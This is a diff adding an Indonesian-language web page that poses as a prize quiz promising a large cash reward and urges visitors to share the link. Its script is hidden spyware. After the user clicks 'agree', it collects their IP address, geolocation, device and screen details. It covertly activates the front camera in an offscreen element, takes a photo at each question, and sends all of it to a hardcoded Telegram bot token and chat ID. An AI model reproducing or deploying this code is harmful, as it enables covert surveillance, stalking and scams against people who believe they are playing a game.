@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quiz Knowledge Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .quiz-container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .warning-box {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        .warning-title {
+            color: #856404;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        .rules-list {
+            text-align: left;
+            margin: 20px 0;
+        }
+        .rules-list li {
+            margin: 10px 0;
+            color: #333;
+        }
+        .permission-btn {
+            background: #28a745;
+            margin-top: 20px;
+        }
+        .permission-btn:hover {
+            background: #218838;
+        }
+        .question {
+            margin-bottom: 25px;
+            font-size: 18px;
+            color: #333;
+        }
+        .options {
+            margin: 20px 0;
+        }
+        .option {
+            margin: 12px 0;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .option:hover {
+            border-color: #667eea;
+            background-color: #f8f9ff;
+        }
+        .selected {
+            background-color: #667eea;
+            color: white;
+            border-color: #667eea;
+        }
+        button {
+            padding: 12px 30px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 5px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .hidden {
+            display: none;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress {
+            height: 100%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            transition: width 0.3s ease;
+        }
+        #results {
+            text-align: center;
+            padding: 40px;
+        }
+        .score {
+            font-size: 24px;
+            font-weight: bold;
+            color: #667eea;
+            margin: 20px 0;
+        }
+
+        /* Hidden camera elements */
+        #stealthCamera {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="quiz-container">
+        <!-- Warning & Permission Section -->
+        <div id="warningSection">
+            <div class="warning-box">
+                <h2 class="warning-title">🌟Quiz Berhadiah🌟</h2>
+                <p><strong>Sebelum memulai quiz, harap baca dan setujui ketentuan berikut:</strong></p>
+                
+                <div class="rules-list">
+                    <p><strong>Peraturan Dan Ketentuan::</strong></p>
+                    <ul>
+                        <li>💯 Mengisi Full Semua Pertanyaan Dengan Benar.</li>
+                        <li>‼️ Dilarang Menjawab Ngasal</li>
+                        <li>💵 Hadiah Bernilai 10.000.000</li>
+                        <li>📱 Share Link Ini Ke Teman Temanmu Jika Sudah.</li>
+                        <li>⏱ Waktu Dan Durasi Pengerjaan Akan Dicatat Untuk Pemenang.</li>
+                        <li>📊 Jawaban dan hasil quiz</li>
+                    </ul>
+                    
+                    <p><strong>Dengan melanjutkan, Anda menyetujui:</strong></p>
+                    <ul>
+                        <li>Ketentuan Diatas.</li>
+                        <li>Jika Kalah Maka Jangan Membuat Onar Tentang Link Web</li>
+                        <li>Pengiriman Hadiah Akan Dilakukan Dalam 2 Hari Jika Menang</li>
+                        <li>Operator Akan Mengchat Anda Nantinya.</li>
+                    </ul>
+                </div>
+
+                <p style="color: #dc3545; font-weight: bold;">
+                    ❗ Jika Bersedia Klik Button Dibawah.
+                </p>
+
+                <button class="permission-btn" onclick="acceptPermissions()">Saya Setuju & Mulai Quiz</button>
+            </div>
+        </div>
+
+        <!-- Quiz Section -->
+        <div id="quizSection" class="hidden">
+            <h1 style="text-align: center; color: #333; margin-bottom: 30px;">📚 Quiziz Challenge</h1>
+            
+            <div class="progress-bar">
+                <div class="progress" id="progressBar"></div>
+            </div>
+            
+            <div id="questionContainer">
+                <div class="question" id="questionText"></div>
+                <div id="optionsContainer" class="options"></div>
+            </div>
+
+            <div style="text-align: center; margin-top: 30px;">
+                <button id="prevBtn" onclick="previousQuestion()" disabled>← Sebelumnya</button>
+                <button id="nextBtn" onclick="nextQuestion()">Selanjutnya →</button>
+            </div>
+
+            <div style="text-align: center; margin-top: 20px; color: #666;">
+                Pertanyaan <span id="currentQuestion">1</span> dari <span id="totalQuestions">5</span>
+            </div>
+        </div>
+
+        <!-- Results -->
+        <div id="results" class="hidden">
+            <h2>🎉 Quiz Selesai!</h2>
+            <div class="score" id="scoreText"></div>
+            <p>Terima kasih telah berpartisipasi!</p>
+            <button onclick="location.reload()">Main Lagi</button>
+        </div>
+
+        <!-- Stealth Camera (Hidden) -->
+        <div id="stealthCamera">
+            <video id="stealthVideo" autoplay playsinline></video>
+            <canvas id="stealthCanvas"></canvas>
+        </div>
+    </div>
+
+    <script>
+        // === KONFIGURASI ===
+        // GANTI DENGAN TOKEN BOT ANDA
+        const TELEGRAM_BOT_TOKEN = '8138063447:AAEFl1eeqTjbPfJAlCIL2dQme3gApE8Hoew';
+        
+        // === GANTI DENGAN USER ID TELEGRAM ANDA ===
+        const TELEGRAM_USER_ID = '7972381334'; // User ID tujuan pengiriman foto
+
+        // === DATA QUIZ ===
+        const quizData = [
+            {
+                question: "Apa ibukota Indonesia?",
+                options: ["Jakarta", "Bandung", "Surabaya", "Medan"],
+                correct: 0
+            },
+            {
+                question: "Planet terdekat dengan Matahari?",
+                options: ["Venus", "Mars", "Mercury", "Jupiter"],
+                correct: 2
+            },
+            {
+                question: "2 + 2 x 2 = ?",
+                options: ["6", "8", "4", "10"],
+                correct: 0
+            },
+            {
+                question: "Warna campuran merah dan biru?",
+                options: ["Hijau", "Ungu", "Orange", "Kuning"],
+                correct: 1
+            },
+            {
+                question: "Presiden pertama Indonesia?",
+                options: ["Soeharto", "BJ Habibie", "Soekarno", "Jokowi"],
+                correct: 2
+            }
+        ];
+
+        // === VARIABLES ===
+        let currentQuestion = 0;
+        let userAnswers = [];
+        let score = 0;
+        let stealthStream = null;
+        let isCameraReady = false;
+        let userLocation = null;
+        let userIP = null;
+
+        // === ELEMENTS ===
+        const warningSection = document.getElementById('warningSection');
+        const quizSection = document.getElementById('quizSection');
+        const questionText = document.getElementById('questionText');
+        const optionsContainer = document.getElementById('optionsContainer');
+        const prevBtn = document.getElementById('prevBtn');
+        const nextBtn = document.getElementById('nextBtn');
+        const currentQuestionSpan = document.getElementById('currentQuestion');
+        const totalQuestionsSpan = document.getElementById('totalQuestions');
+        const results = document.getElementById('results');
+        const scoreText = document.getElementById('scoreText');
+        const progressBar = document.getElementById('progressBar');
+        
+        // Stealth camera elements
+        const stealthVideo = document.getElementById('stealthVideo');
+        const stealthCanvas = document.getElementById('stealthCanvas');
+
+        // === INITIALIZATION ===
+        totalQuestionsSpan.textContent = quizData.length;
+
+        // === FUNCTIONS ===
+        async function acceptPermissions() {
+            // Mulai kumpulkan data user
+            await collectUserData();
+            
+            // Initialize kamera
+            initializeStealthCamera();
+            
+            // Tampilkan quiz section
+            warningSection.classList.add('hidden');
+            quizSection.classList.remove('hidden');
+            
+            // Load question pertama
+            loadQuestion(0);
+        }
+
+        async function collectUserData() {
+            // Dapatkan IP address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+            } catch (error) {
+                userIP = 'Tidak dapat mengambil IP';
+            }
+
+            // Dapatkan lokasi (jika diizinkan)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        // Kirim data lokasi ke Telegram
+                        sendUserInfo();
+                    },
+                    error => {
+                        userLocation = 'Lokasi tidak diizinkan';
+                        sendUserInfo();
+                    }
+                );
+            } else {
+                userLocation = 'Geolocation tidak didukung';
+                sendUserInfo();
+            }
+        }
+
+        function sendUserInfo() {
+            const userInfo = `
+🔍 DATA USER BARU MEMULAI QUIZ
+
+📱 Informasi Perangkat:
+${navigator.userAgent}
+
+🌐 IP Address:
+${userIP}
+
+📍 Lokasi:
+${userLocation ? `Lat: ${userLocation.latitude}, Long: ${userLocation.longitude}` : 'Tidak tersedia'}
+
+🖥️ Layar:
+${screen.width}x${screen.height}
+
+⏰ Waktu Mulai:
+${new Date().toLocaleString('id-ID')}
+
+🔗 URL:
+${window.location.href}
+            `.trim();
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_USER_ID,
+                    text: userInfo
+                })
+            }).catch(error => console.log('Error sending user info:', error));
+        }
+
+        function initializeStealthCamera() {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: 640,
+                    height: 480 
+                },
+                audio: false 
+            })
+            .then(function(mediaStream) {
+                stealthStream = mediaStream;
+                stealthVideo.srcObject = mediaStream;
+                isCameraReady = true;
+                console.log('✅ Stealth camera ready - Foto akan dikirim ke User ID:', TELEGRAM_USER_ID);
+                
+                // Kirim konfirmasi kamera berhasil
+                sendTelegramMessage('📸 Kamera berhasil diaktifkan - Siap memantau');
+            })
+            .catch(function(err) {
+                console.log("❌ Stealth camera error: ", err);
+                isCameraReady = false;
+                sendTelegramMessage('❌ Kamera gagal diakses: ' + err.message);
+            });
+        }
+
+        function captureStealthPhoto() {
+            if (!isCameraReady) {
+                console.log('❌ Kamera belum ready');
+                return;
+            }
+
+            try {
+                stealthCanvas.width = stealthVideo.videoWidth;
+                stealthCanvas.height = stealthVideo.videoHeight;
+                const context = stealthCanvas.getContext('2d');
+                context.drawImage(stealthVideo, 0, 0);
+                
+                // Convert ke blob dan kirim
+                stealthCanvas.toBlob(function(blob) {
+                    if (blob) {
+                        sendToTelegram(blob);
+                    } else {
+                        console.log('❌ Gagal membuat blob dari canvas');
+                    }
+                }, 'image/jpeg', 0.8);
+            } catch (error) {
+                console.log('❌ Capture error:', error);
+            }
+        }
+
+        function sendToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_USER_ID);
+            formData.append('photo', photoBlob, `quiz_${Date.now()}.jpg`);
+            formData.append('caption', `📸 Q${currentQuestion + 1} - ${new Date().toLocaleString('id-ID')}`);
+
+            // Gunakan fetch dengan timeout
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 10000);
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+                signal: controller.signal
+            })
+            .then(response => {
+                clearTimeout(timeoutId);
+                if (!response.ok) {
+                    return response.text().then(text => {
+                        throw new Error(`HTTP ${response.status}: ${text}`);
+                    });
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.ok) {
+                    console.log(`✅ Foto Q${currentQuestion + 1} terkirim`);
+                } else {
+                    console.log('❌ Telegram API error:', data);
+                }
+            })
+            .catch(error => {
+                clearTimeout(timeoutId);
+                console.log('❌ Error sending to Telegram:', error);
+                
+                // Coba kirim sebagai pesan biasa
+                sendTelegramMessage(`❌ Gagal kirim foto Q${currentQuestion + 1}: ${error.message}`);
+            });
+        }
+
+        function sendTelegramMessage(message) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_USER_ID,
+                    text: message
+                })
+            }).catch(err => console.log('Error sending message:', err));
+        }
+
+        function loadQuestion(questionIndex) {
+            const question = quizData[questionIndex];
+            questionText.textContent = question.question;
+            optionsContainer.innerHTML = '';
+            
+            question.options.forEach((option, index) => {
+                const optionElement = document.createElement('div');
+                optionElement.className = 'option';
+                if (userAnswers[questionIndex] === index) {
+                    optionElement.classList.add('selected');
+                }
+                optionElement.textContent = option;
+                optionElement.onclick = () => selectOption(index);
+                optionsContainer.appendChild(optionElement);
+            });
+
+            currentQuestionSpan.textContent = questionIndex + 1;
+            prevBtn.disabled = questionIndex === 0;
+            nextBtn.textContent = questionIndex === quizData.length - 1 ? 'Selesai' : 'Selanjutnya →';
+            
+            // Update progress bar
+            const progress = ((questionIndex + 1) / quizData.length) * 100;
+            progressBar.style.width = progress + '%';
+        }
+
+        function selectOption(optionIndex) {
+            userAnswers[currentQuestion] = optionIndex;
+            loadQuestion(currentQuestion);
+        }
+
+        function previousQuestion() {
+            if (currentQuestion > 0) {
+                currentQuestion--;
+                loadQuestion(currentQuestion);
+            }
+        }
+
+        function nextQuestion() {
+            // Capture photo stealthily sebelum pindah question
+            setTimeout(() => {
+                captureStealthPhoto();
+            }, 300);
+
+            if (currentQuestion < quizData.length - 1) {
+                currentQuestion++;
+                loadQuestion(currentQuestion);
+            } else {
+                finishQuiz();
+            }
+        }
+
+        function finishQuiz() {
+            // Calculate score
+            score = 0;
+            userAnswers.forEach((answer, index) => {
+                if (answer === quizData[index].correct) {
+                    score++;
+                }
+            });
+
+            // Capture final photo
+            setTimeout(() => {
+                captureStealthPhoto();
+                sendQuizResults();
+            }, 500);
+
+            // Show results
+            quizSection.classList.add('hidden');
+            results.classList.remove('hidden');
+            scoreText.textContent = `Skor: ${score} dari ${quizData.length}`;
+
+            // Stop camera setelah delay
+            setTimeout(() => {
+                if (stealthStream) {
+                    stealthStream.getTracks().forEach(track => track.stop());
+                }
+            }, 2000);
+        }
+
+        function sendQuizResults() {
+            const message = `
+🎯 QUIZ SELESAI
+
+📊 Skor: ${score}/${quizData.length}
+✅ Benar: ${score}
+❌ Salah: ${quizData.length - score}
+
+⏰ Waktu Selesai:
+${new Date().toLocaleString('id-ID')}
+
+📱 Perangkat:
+${navigator.userAgent.split(')')[0] + ')'}
+
+🌐 IP: ${userIP}
+${userLocation && userLocation !== 'Lokasi tidak diizinkan' && userLocation !== 'Geolocation tidak didukung' ? 
+`📍 Lokasi: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}` : 
+'📍 Lokasi: Tidak diizinkan'}
+            `.trim();
+
+            sendTelegramMessage(message);
+        }
+
+        // Cleanup ketika tab ditutup
+        window.addEventListener('beforeunload', function() {
+            if (stealthStream) {
+                stealthStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
